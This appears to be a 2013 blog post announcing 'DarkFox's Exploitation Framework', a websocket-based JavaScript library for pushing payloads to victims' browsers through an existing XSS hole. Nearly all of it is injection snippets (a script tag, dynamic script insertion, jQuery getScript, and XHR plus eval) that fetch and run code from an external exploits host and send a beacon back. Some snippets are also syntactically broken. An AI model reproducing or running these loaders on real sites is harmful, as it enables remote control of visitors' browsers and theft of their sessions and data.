---
title: DarkFox's Exploitation Framework.js
author: DarkFox
date: 2013-04-12
---

HTML5 and web2 have offered a lot of different things, websockets are one of
them. I have put aside some time to build a framework for developers to write
payloads and have the ability to dynamically send scripts to their users.
Currently there is no fallback to the websockets but I do not intend to use
flash or java so will be using a long-polling approach for the fallback.

There are a number of ways to get the script to run in the user's browser
through XSS. To expect this tool to work, you need to run code on the page so
I assume you already have the XSS vulnerability in the site you're testing.

Direct HTML into the page
=========================

Often enough you include your XSS vector through a script tag, the following
above your code will give you the required library.

~~~ html
<script src=//darkfox.us.to/exploits/dfef.js></script>
~~~

In your own js file
===================

In your own javascript files, you can dynamically include my library to the page
and run your code when it loads.

``` javascript
var DF_AUTORUN = function { df.post(false, "ping") }
(s = document.createElement("script"))
 .src   = "//darkfox.us.to/exploits/dfef.js";
s.async = true;
document.body.appendChild(s)
```

With jQuery
===========

Many sites have jQuery as a common library, however, I highly recommend to not
use jQuery as the dependancy of such a large library that could be removed which
would lead your code to break.

``` javascript
$.getScript("//darkfox.us.to/exploits/dfef/darkfox.js", function () {
    df.post(false, "ping")
});
```

Eval XHR response
=================

Although XHR requests have been made to be much easier to use with the library,
you could use an XHR request to load the library it's self.

``` javascript
var x = new XMLHttpRequest || ActiveXObject("Microsoft.XMLHTTP"), myFunc;
x.open("get", "http://darkfox.us.to/exploits/dfef/darkfox.js");
x.addEventListener("load", function () { (0,eval)(this.response); myFunc });
x.send();

myFunc = function { df.post(false, "ping") }
```

Uselessly with the framework it's self
======================================

Useless as you'd already have the framework but here we go.

``` javascript
df.get("http://darkfox.us.to/exploits/dfef/darkfox.js", undefined, false)
  .e("load", function () { df.post(false, "ping") }).s()
```
